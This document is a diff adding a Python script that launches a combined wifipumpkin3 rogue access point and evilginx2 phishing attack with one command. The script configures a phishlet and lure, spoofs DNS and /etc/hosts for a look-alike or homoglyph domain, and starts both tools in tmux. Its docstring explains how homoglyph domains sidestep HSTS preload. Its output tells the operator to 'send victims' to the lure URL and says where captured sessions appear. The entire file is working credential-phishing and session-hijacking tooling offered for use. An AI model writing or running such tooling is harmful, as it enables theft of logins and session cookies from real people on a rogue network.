@@ -1,0 +1,246 @@
+#!/usr/bin/env python3
+# SPDX-License-Identifier: GPL-2.0
+"""Launch the wifipumpkin3 + evilginx2 (phishkin3) attack from one command.
+
+The manual procedure -- https://docs.wifipumpkin3.com/blog/tutorials/phishkin3 --
+is a lot of moving parts: an evilginx config, a phishlet enabled with a fake
+hostname, a lure to get the landing URL, /etc/hosts entries, a wp3 .pulp with a
+DNS spoof and the phishkin3 proxy, then both tools started in the right order.
+This does all of it from three inputs: the phishlet, the fake domain, and the AP
+interface.
+
+The fake domain is never the real one. Instagram and the like are in the browser
+HSTS preload list, so a spoof of instagram.com is refused before it starts. A
+look-alike -- a plain one like insta-login.com, or a homoglyph like instagr<cyr
+a>m.com -- is a different domain to the browser, so the spoof answers and
+evilginx's self-signed cert (developer mode) is accepted on the local network.
+Homoglyph domains are converted to punycode here, which is what actually goes
+into evilginx, the DNS spoof and /etc/hosts.
+
+  rhodep-phishkin3-launch --phishlet instagram --domain 'instagram.com' \
+      --interface wlan1 [--start]
+
+Without --start it prints the plan and the lure URL and stops (a dry run).
+With --start it writes everything and launches wp3 and evilginx in tmux.
+"""
+
+import argparse
+import os
+import subprocess
+import sys
+import time
+
+EVILGINX = "evilginx2"
+PHISHLETS_DIR = "/usr/share/evilginx2/phishlets"
+EV_CONFIG_DIR = "/root/.config/nethunter-phishkin3/evilginx"
+PULP_PATH = "/root/.config/nethunter-phishkin3/attack.pulp"
+HOSTS = "/etc/hosts"
+HOSTS_MARK = "# nethunter-phishkin3"
+AP_IP = "172.16.0.1"
+PROXY_PORT = 8080
+
+
+def say(m):
+    sys.stdout.write(m + "\n")
+    sys.stdout.flush()
+
+
+def to_punycode(domain):
+    """IDN/homoglyph domain -> the ASCII punycode the tools actually use.
+
+    A domain typed with Cyrillic or dotless-i look-alikes is not ASCII; every
+    tool in the chain (evilginx, the DNS spoof, /etc/hosts) needs the punycode
+    form, e.g. instagr<cyr a>m.com -> xn--instgram-l2g.com. Pure-ASCII domains
+    pass through unchanged.
+    """
+    try:
+        return domain.encode("idna").decode("ascii")
+    except Exception:
+        # Per-label, so a partly-ASCII domain still converts what it can.
+        out = []
+        for label in domain.split("."):
+            try:
+                out.append(label.encode("idna").decode("ascii") if label else "")
+            except Exception:
+                out.append(label)
+        return ".".join(out)
+
+
+def phishlet_landing_sub(phishlet_path):
+    """The subdomain evilginx will land on, read from the phishlet yaml.
+
+    Prefer the proxy_host marked is_landing; fall back to the first phish_sub.
+    Returned so /etc/hosts and the DNS spoof can list the right hostnames.
+    """
+    subs = []
+    landing = None
+    try:
+        import re
+        text = open(phishlet_path, encoding="utf-8", errors="replace").read()
+        for m in re.finditer(r"phish_sub:\s*['\"]?([\w.-]+)", text):
+            subs.append(m.group(1))
+        lm = re.search(r"is_landing:\s*true", text)
+        if lm:
+            # the phish_sub nearest before is_landing on the same line
+            for line in text.splitlines():
+                if "is_landing: true" in line:
+                    sm = re.search(r"phish_sub:\s*['\"]?([\w.-]+)", line)
+                    if sm:
+                        landing = sm.group(1)
+                        break
+    except OSError:
+        pass
+    return landing, subs
+
+
+def run_evilginx_setup(phishlet, domain_puny, landing_sub):
+    """Drive evilginx once, non-interactively, to set config and make a lure.
+
+    evilginx v3 has no config file for phishlets/lures (it uses a BuntDB store),
+    so the reliable way to set them is to feed its own commands on stdin. This
+    returns the lure URL it prints.
+    """
+    os.makedirs(EV_CONFIG_DIR, exist_ok=True)
+    cmds = "\n".join([
+        "config domain %s" % domain_puny,
+        "config ipv4 %s" % AP_IP,
+        "phishlets hostname %s %s" % (phishlet, domain_puny),
+        "phishlets enable %s" % phishlet,
+        "lures create %s" % phishlet,
+        "lures get-url 0",
+        "exit",
+        "",
+    ])
+    say("configuring evilginx (domain %s, phishlet %s)" % (domain_puny, phishlet))
+    p = subprocess.run(
+        [EVILGINX, "-c", EV_CONFIG_DIR, "-p", PHISHLETS_DIR, "-developer"],
+        input=cmds, capture_output=True, text=True, timeout=60)
+    # The lure URL is the last bare https:// line evilginx prints (get-url's
+    # output). Matching on the domain is fragile when the domain has odd
+    # characters, so take the last standalone URL line instead.
+    url = None
+    for line in (p.stdout or "").splitlines():
+        s = line.strip()
+        if s.startswith("https://") and " " not in s:
+            url = s
+    if not url:
+        say("could not get a lure URL; evilginx said:")
+        say((p.stdout or "")[-800:])
+    return url
+
+
+def write_hosts(domain_puny, subs):
+    """Point the fake domain and its subdomains at the AP, in /etc/hosts."""
+    hostnames = [domain_puny] + ["%s.%s" % (s, domain_puny) for s in subs]
+    # de-dup, keep order
+    seen, ordered = set(), []
+    for h in hostnames:
+        if h not in seen:
+            seen.add(h)
+            ordered.append(h)
+    lines = [l for l in open(HOSTS).read().splitlines()
+             if HOSTS_MARK not in l]
+    for h in ordered:
+        lines.append("%s %s %s" % (AP_IP, h, HOSTS_MARK))
+    open(HOSTS, "w").write("\n".join(lines) + "\n")
+    say("wrote %d hosts entries pointing at %s" % (len(ordered), AP_IP))
+    return ordered
+
+
+def write_pulp(interface, domain_puny, lure_url):
+    """The wp3 script: AP, DHCP class B, phishkin3 proxy, DNS spoof."""
+    pulp = "\n".join([
+        "set interface %s" % interface,
+        "dhcpconf 1",
+        "set proxy phishkin3 true",
+        "set phishkin3.cloud_url_phishing %s" % lure_url,
+        "set phishkin3.proxy_port %d" % PROXY_PORT,
+        "set phishkin3.redirect_url_after_login https://google.com",
+        "set phishkin3.allow_user_login_endpoint /verify",
+        "use spoof.dns_spoof",
+        "add %s" % domain_puny,
+        "add *.%s" % domain_puny,
+        "set redirectTo %s" % AP_IP,
+        "start",
+        "back",
+        "start",
+        "",
+    ])
+    os.makedirs(os.path.dirname(PULP_PATH), exist_ok=True)
+    open(PULP_PATH, "w").write(pulp)
+    say("wrote wp3 script %s" % PULP_PATH)
+
+
+def start_in_tmux(interface):
+    """wp3 first (creates the AP), then evilginx, each in a tmux window.
+
+    tmux so both survive the launcher exiting and can be attached for logs:
+        tmux attach -t phishkin3
+    """
+    if not subprocess.run(["sh", "-c", "command -v tmux"],
+                          stdout=subprocess.DEVNULL).returncode == 0:
+        sys.exit("tmux is not installed; needed to run both tools")
+    subprocess.run(["tmux", "kill-session", "-t", "phishkin3"],
+                   stderr=subprocess.DEVNULL)
+    subprocess.run([
+        "tmux", "new-session", "-d", "-s", "phishkin3", "-n", "wp3",
+        "wifipumpkin3 -p %s" % PULP_PATH])
+    say("started wp3 in tmux (window wp3)")
+    time.sleep(8)  # let the AP come up before evilginx binds
+    subprocess.run([
+        "tmux", "new-window", "-t", "phishkin3", "-n", "evilginx",
+        "%s -c %s -p %s -developer" % (EVILGINX, EV_CONFIG_DIR, PHISHLETS_DIR)])
+    say("started evilginx in tmux (window evilginx)")
+    say("attach with: tmux attach -t phishkin3")
+
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--phishlet", required=True)
+    ap.add_argument("--domain", required=True,
+                    help="fake look-alike domain, never the real one")
+    ap.add_argument("--interface", default="wlan1")
+    ap.add_argument("--start", action="store_true",
+                    help="actually launch; without it, dry-run and print the plan")
+    args = ap.parse_args()
+
+    if os.geteuid() != 0:
+        sys.exit("must run as root")
+
+    phishlet_path = os.path.join(PHISHLETS_DIR, args.phishlet + ".yaml")
+    if not os.path.isfile(phishlet_path):
+        sys.exit("phishlet not found: %s" % phishlet_path)
+
+    domain_puny = to_punycode(args.domain)
+    if domain_puny != args.domain:
+        say("domain %s -> punycode %s" % (args.domain, domain_puny))
+    landing, subs = phishlet_landing_sub(phishlet_path)
+    if not subs:
+        subs = ["login", "www"]
+    say("phishlet subdomains: %s" % ", ".join(subs))
+
+    lure_url = run_evilginx_setup(args.phishlet, domain_puny, landing)
+    if not lure_url:
+        sys.exit("evilginx setup failed")
+    say("")
+    say("LURE URL: %s" % lure_url)
+    say("")
+
+    if not args.start:
+        say("dry run -- nothing launched. Re-run with --start to attack.")
+        say("plan:")
+        say("  hosts: %s and *.%s -> %s" % (domain_puny, domain_puny, AP_IP))
+        say("  wp3: AP on %s, DHCP class B, phishkin3 + dns_spoof" % args.interface)
+        say("  evilginx: developer mode, phishlet %s" % args.phishlet)
+        return
+
+    write_hosts(domain_puny, subs)
+    write_pulp(args.interface, domain_puny, lure_url)
+    start_in_tmux(args.interface)
+    say("")
+    say("attack running. Send victims to: %s" % lure_url)
+    say("captured sessions appear in the evilginx window (tmux attach -t phishkin3)")
+
+
+if __name__ == "__main__":
+    main()
